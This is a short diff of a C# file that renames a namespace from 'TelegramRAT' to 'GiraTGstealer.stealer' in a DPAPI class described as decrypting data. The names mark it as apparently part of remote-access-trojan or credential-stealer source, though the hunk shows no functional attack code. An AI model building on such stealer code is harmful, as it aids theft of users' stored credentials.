@@ -4,7 +4,7 @@ using System.Runtime.InteropServices;
 using System.ComponentModel;
 
 // Decrypt data using DPAPI functions.
-namespace TelegramRAT
+namespace GiraTGstealer.stealer
 {
     internal class DPAPI
     {
